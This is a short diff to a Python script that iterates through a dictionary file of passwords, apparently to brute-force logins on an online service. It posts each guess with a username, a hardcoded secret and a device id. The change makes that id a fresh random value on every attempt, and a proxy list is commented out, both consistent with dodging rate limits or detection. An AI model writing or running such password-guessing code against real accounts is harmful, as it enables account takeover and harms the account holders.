@@ -1,5 +1,5 @@
 import requests
-import uuid
+from uuid import uuid4
 import tkinter as tk
 from tkinter import filedialog
 
@@ -7,9 +7,7 @@ root = tk.Tk()
 root.withdraw()
 
 def Main(dictionary):
-    uid = uuid.uuid4()
     passwords = []
-    dictionary_selected = False
 
     # proxies = "proxies.txt"
 
@@ -41,7 +39,7 @@ def Main(dictionary):
     for password in passwords:
         data = {
             "userName":user,
-            "udid":uid,
+            "udid":uuid4(),
             "password":password,
             "secret":"Wmfv3899gc9"
         }
